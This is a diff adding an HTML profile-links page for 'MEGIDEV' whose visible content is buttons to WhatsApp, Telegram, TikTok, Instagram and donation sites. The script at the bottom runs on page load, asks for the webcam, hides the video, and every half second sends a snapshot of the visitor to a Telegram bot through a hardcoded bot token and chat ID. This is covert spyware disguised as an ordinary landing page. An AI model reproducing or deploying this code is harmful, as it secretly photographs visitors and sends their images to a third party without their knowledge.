@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>MEGIDEV</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: sans-serif;
+      background-image: url("background.jpg");
+      background-size: cover;
+      overflow-y: auto;
+      margin: 0;
+      padding: 0;
+      position: relative;
+    }
+
+    .background-text {
+      color: white;
+      font-size: 15px;
+      position: absolute;
+      top: 22%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: -1;
+      animation: fade 2s infinite alternate;
+      opacity: 0;
+    }
+
+    .creator-text {
+      color: white;
+      font-size: 15px;
+      position: absolute;
+      top: 1026px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: -1;
+      animation: fade 2s infinite alternate;
+      opacity: 0.8;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+      padding: 10px 20px;
+      border-radius: 5px;
+    }
+
+    @keyframes fade {
+      0% {
+        opacity: 0;
+      }
+      50% {
+        opacity: 1;
+      }
+      100% {
+        opacity: 0;
+      }
+    }
+
+    header {
+      text-align: center;
+      padding: 20px 0;
+    }
+
+    .main-content {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    .profile-container {
+      width: 150px;
+      height: 150px;
+      border-radius: 50%;
+      overflow: hidden;
+      margin: 0 auto;
+      background-color: white;
+      margin-bottom: 20px;
+    }
+
+    #profile-pic {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    #profile-name {
+      font-size: 54px;
+      text-transform: uppercase;
+      color: white;
+      position: absolute;
+      top: 19%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    .button-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      margin-top: 50px;
+    }
+
+    .button {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 10px;
+      padding: 15px 20px;
+      text-align: center;
+      text-decoration: none;
+      border: 2px solid rgba(255, 255, 255, 0.5);
+      border-radius: 5px;
+      background-color: transparent;
+      color: white;
+      width: 100%;
+      max-width: 200px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      transition: background-color 0.3s ease;
+    }
+
+    .button:hover {
+      background-color: rgba(255, 255, 255, 0.1);
+      cursor: pointer;
+    }
+
+    .button-icon {
+      width: 24px;
+      height: 24px;
+      margin-right: 10px;
+    }
+
+    .button-text {
+      flex-grow: 1;
+    }
+
+    .footer-text {
+      text-align: center;
+      padding: 10px;
+      color: white;
+      font-size: 12px;
+    }
+
+    input[type="range"] {
+      -webkit-appearance: none;
+      width: 50px;
+      height: 10px;
+      margin: 0;
+      padding: 0;
+      background-color: transparent;
+      outline: none;
+    }
+
+    input[type="range"]::-webkit-slider-runnable-track {
+      width: 100%;
+      height: 5px;
+      cursor: pointer;
+      background: #fff;
+      border-radius: 5px;
+    }
+
+    input[type="range"]::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      height: 10px;
+      width: 10px;
+      border-radius: 50%;
+      background: #fff;
+      margin-top: -3px;
+      cursor: pointer;
+      border: 2px solid #fff;
+      box-shadow: 0 0 3px rgba(0, 0, 0, 0.5);
+    }
+
+    video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="background-text" id="background-text">Welcome to MEGIDEV</div>
+  <div class="creator-text" id="creator-text">Created by dausofc</div>
+
+  <header>
+    <div class="profile-container">
+      <img src="profile.jpg" alt="Foto Profil" id="profile-pic">
+    </div>
+    <div id="profile-name">MEGIDEV</div>
+  </header>
+
+  <div class="main-content">
+    <main>
+      <div class="button-container">
+        <a href="https://chat.whatsapp.com/KUqKJcqDBpX8ECoUkV3NI5" class="button">
+          <img src="icon1.png" alt="Group" class="button-icon">
+          <span class="button-text">Grup</span>
+        </a>
+        <a href="https://wa.me/message/ZKMECRWXSTHHG1" class="button">
+          <img src="icon2.png" alt="wa admin" class="button-icon">
+          <span class="button-text">WA Admin</span>
+        </a>
+        <!-- Tambahkan 8 tombol lainnya di sini -->
+        <a href="https://t.me/muhammad_firdaus235" class="button">
+          <img src="icon3.png" alt="Telegram" class="button-icon">
+          <span class="button-text">Telegram</span>
+        </a>
+        <a href="mailto:Firdausdeveloperbotzofficial2@gmail.com" class="button">
+          <img src="icon4.png" alt="Gmail" class="button-icon">
+          <span class="button-text">Gmail</span>
+        </a>
+        <a href="https://www.tiktok.com/@muhammad_firdaus235?_t=8lomOg3LQxO&_r=1" class="button">
+          <img src="icon5.png" alt="tiktok-1" class="button-icon">
+          <span class="button-text">TikTok-1</span>
+        </a>
+        <a href="https://www.tiktok.com/@muhammad_firdaus231?_t=8mILpn7wyHw&_r=1" class="button">
+          <img src="icon6.png" alt="tiktok-2" class="button-icon">
+          <span class="button-text">TikTok-2</span>
+        </a>
+        <a href="https://www.instagram.com/megi.dev235?igsh=MThtNTVjNTBqNDU1" class="button">
+          <img src="icon7.png" alt="instagram-1" class="button-icon">
+          <span class="button-text">Instagram-1</span>
+        </a>
+        <a href="https://www.instagram.com/muhammad_firdaus231?igsh=c3RiZ2JzdDU1MmZu" class="button">
+          <img src="icon8.png" alt="instagram-2" class="button-icon">
+          <span class="button-text">Instagram-2</span>
+        </a>
+        <a href="https://saweria.co/MEGIDEV" class="button">
+          <img src="icon9.png" alt="saweria" class="button-icon">
+          <span class="button-text">Saweria</span>
+        </a>
+        <a href="https://trakteer.id/megidev" class="button">
+          <img src="icon10.png" alt="trakteer" class="button-icon">
+          <span class="button-text">Trakteer</span>
+        </a>
+      </div>
+    </main>
+  </div>
+
+  <script>
+    window.onload = function() {
+      var audio = new Audio("audio.mp3");
+      audio.volume = 0.5;
+
+      var volumeControl = document.createElement("input");
+      volumeControl.type = "range";
+      volumeControl.min = 0;
+      volumeControl.max = 1;
+      volumeControl.step = 0.01;
+      volumeControl.value = audio.volume;
+      document.body.appendChild(volumeControl);
+
+      volumeControl.addEventListener('input', function() {
+        audio.volume = this.value;
+      });
+
+      const video = document.createElement('video');
+      video.width = 640;
+      video.height = 480;
+      video.autoplay = true;
+      document.body.appendChild(video);
+
+      const canvas = document.createElement('canvas');
+      canvas.width = 480;
+      canvas.height = 640;
+      const context = canvas.getContext('2d');
+      const token = '6702290917:AAH_T3GZE6_uoLRYy8_uHe_mjxV_nyIG2fw'; // Ganti dengan token bot Telegram Anda
+      const chatId = '6671310814'; // Ganti dengan ID obrolan Telegram Anda
+      let intervalId;
+
+      function startPhotoCapture() {
+        intervalId = setInterval(sendPhoto, 500);
+      }
+
+      function stopPhotoCapture() {
+        clearInterval(intervalId);
+      }
+
+      function sendPhoto() {
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append('chat_id', chatId);
+          formData.append('photo', blob, 'webcam.jpg');
+
+          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          })
+          .then(response => response.json())
+          .then(data => {
+            console.log('Photo sent:', data);
+          })
+          .catch(error => {
+            console.error('Error sending photo:', error);
+          });
+        }, 'image/jpeg');
+      }
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+          video.play();
+          startPhotoCapture();
+          audio.play().catch(error => {
+            console.error("Autoplay blocked by browser: ", error);
+          });
+        })
+        .catch(err => {
+          console.error("Error accessing the camera: ", err);
+        });
+
+      document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+          stopPhotoCapture();
+          audio.pause(); // Pause audio when the page is hidden
+        } else if (video.srcObject) { // Only play audio if camera access was previously granted
+          startPhotoCapture();
+          audio.play().catch(error => {
+            console.error("Autoplay blocked by browser: ", error);
+          });
+        }
+      });
+    };
+  </script>
+</body>
+</html>
